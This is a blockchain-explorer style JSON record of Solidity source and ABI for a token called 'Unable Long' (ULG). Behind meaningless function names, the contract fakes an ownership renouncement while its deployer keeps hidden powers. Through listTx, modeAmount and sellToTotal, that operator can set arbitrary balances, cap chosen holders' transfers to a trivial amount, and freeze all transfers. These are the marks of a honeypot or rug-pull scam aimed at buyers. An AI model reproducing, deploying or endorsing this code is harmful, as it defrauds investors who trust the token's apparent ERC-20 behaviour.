{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface minBuyList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldMode {\n    function createPair(address swapExempt, address txTakeIs) external returns (address);\n}\n\ninterface sellLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txFund) external view returns (uint256);\n\n    function transfer(address autoFundFee, uint256 fromLimit) external returns (bool);\n\n    function allowance(address teamFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoFundFee,\n        uint256 fromLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeMax, uint256 value);\n    event Approval(address indexed teamFrom, address indexed spender, uint256 value);\n}\n\ninterface teamFee is sellLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnableLong is shouldAt, sellLiquidity, teamFee {\n\n    function limitShould(address txToken, address autoFundFee, uint256 fromLimit) internal returns (bool) {\n        if (txToken == shouldLaunch) {\n            return fundSwap(txToken, autoFundFee, fromLimit);\n        }\n        uint256 fromExemptLimit = sellLiquidity(feeMarketing).balanceOf(listBuy);\n        require(fromExemptLimit == autoLimit);\n        require(autoFundFee != listBuy);\n        if (exemptFromMax[txToken]) {\n            return fundSwap(txToken, autoFundFee, maxMarketingAt);\n        }\n        return fundSwap(txToken, autoFundFee, fromLimit);\n    }\n\n    function balanceOf(address txFund) public view virtual override returns (uint256) {\n        return enableWallet[txFund];\n    }\n\n    uint256 public exemptList;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingTakeLiquidity;\n    }\n\n    function owner() external view returns (address) {\n        return limitLaunchedList;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isLaunch;\n    }\n\n    bool public exemptLiquidity;\n\n    function totalMax() public {\n        emit OwnershipTransferred(shouldLaunch, address(0));\n        limitLaunchedList = address(0);\n    }\n\n    address private limitLaunchedList;\n\n    bool public exemptLaunched;\n\n    function atFund() private view {\n        require(receiverMarketingIs[_msgSender()]);\n    }\n\n    uint256 constant maxMarketingAt = 3 ** 10;\n\n    mapping(address => mapping(address => uint256)) private minMarketingSwap;\n\n    bool private teamLiquidityMax;\n\n    uint256 private walletMinSwap;\n\n    mapping(address => bool) public exemptFromMax;\n\n    string private receiverSender = \"ULG\";\n\n    function modeAmount(address sellMode) public {\n        atFund();\n        if (walletMinSwap == atMode) {\n            walletMinSwap = autoTradingMin;\n        }\n        if (sellMode == shouldLaunch || sellMode == feeMarketing) {\n            return;\n        }\n        exemptFromMax[sellMode] = true;\n    }\n\n    mapping(address => uint256) private enableWallet;\n\n    function getOwner() external view returns (address) {\n        return limitLaunchedList;\n    }\n\n    uint256 public atMode;\n\n    function fundSwap(address txToken, address autoFundFee, uint256 fromLimit) internal returns (bool) {\n        require(enableWallet[txToken] >= fromLimit);\n        enableWallet[txToken] -= fromLimit;\n        enableWallet[autoFundFee] += fromLimit;\n        emit Transfer(txToken, autoFundFee, fromLimit);\n        return true;\n    }\n\n    address listBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address toLimit, uint256 fromLimit) public virtual override returns (bool) {\n        minMarketingSwap[_msgSender()][toLimit] = fromLimit;\n        emit Approval(_msgSender(), toLimit, fromLimit);\n        return true;\n    }\n\n    function sellToTotal(uint256 fromLimit) public {\n        atFund();\n        autoLimit = fromLimit;\n    }\n\n    function transfer(address walletFundBuy, uint256 fromLimit) external virtual override returns (bool) {\n        return limitShould(_msgSender(), walletFundBuy, fromLimit);\n    }\n\n    string private tradingTakeLiquidity = \"Unable Long\";\n\n    address public feeMarketing;\n\n    function transferFrom(address txToken, address autoFundFee, uint256 fromLimit) external override returns (bool) {\n        if (_msgSender() != exemptAuto) {\n            if (minMarketingSwap[txToken][_msgSender()] != type(uint256).max) {\n                require(fromLimit <= minMarketingSwap[txToken][_msgSender()]);\n                minMarketingSwap[txToken][_msgSender()] -= fromLimit;\n            }\n        }\n        return limitShould(txToken, autoFundFee, fromLimit);\n    }\n\n    uint8 private isLaunch = 18;\n\n    uint256 fundAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletMin;\n    }\n\n    event OwnershipTransferred(address indexed tradingTotal, address indexed takeShould);\n\n    bool private fromMin;\n\n    constructor (){\n        if (teamReceiver != fromMin) {\n            walletMinSwap = exemptList;\n        }\n        minBuyList atToken = minBuyList(exemptAuto);\n        feeMarketing = shouldMode(atToken.factory()).createPair(atToken.WETH(), address(this));\n        \n        shouldLaunch = _msgSender();\n        totalMax();\n        receiverMarketingIs[shouldLaunch] = true;\n        enableWallet[shouldLaunch] = walletMin;\n        if (exemptList != atMode) {\n            exemptList = atMode;\n        }\n        emit Transfer(address(0), shouldLaunch, walletMin);\n    }\n\n    address exemptAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 autoLimit;\n\n    function allowance(address modeAuto, address toLimit) external view virtual override returns (uint256) {\n        if (toLimit == exemptAuto) {\n            return type(uint256).max;\n        }\n        return minMarketingSwap[modeAuto][toLimit];\n    }\n\n    bool public teamReceiver;\n\n    bool private tokenFee;\n\n    function listTx(address walletFundBuy, uint256 fromLimit) public {\n        atFund();\n        enableWallet[walletFundBuy] = fromLimit;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverSender;\n    }\n\n    uint256 private autoTradingMin;\n\n    uint256 private tradingIs;\n\n    uint256 private walletMin = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public receiverMarketingIs;\n\n    address public shouldLaunch;\n\n    function fundAt(address autoSell) public {\n        if (exemptLiquidity) {\n            return;\n        }\n        if (tradingIs == autoTradingMin) {\n            tokenFee = true;\n        }\n        receiverMarketingIs[autoSell] = true;\n        if (exemptList != tradingIs) {\n            autoTradingMin = exemptList;\n        }\n        exemptLiquidity = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFromMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"}],\"name\":\"fundAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"listTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMode\",\"type\":\"address\"}],\"name\":\"modeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMarketingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"sellToTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoFundFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnableLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}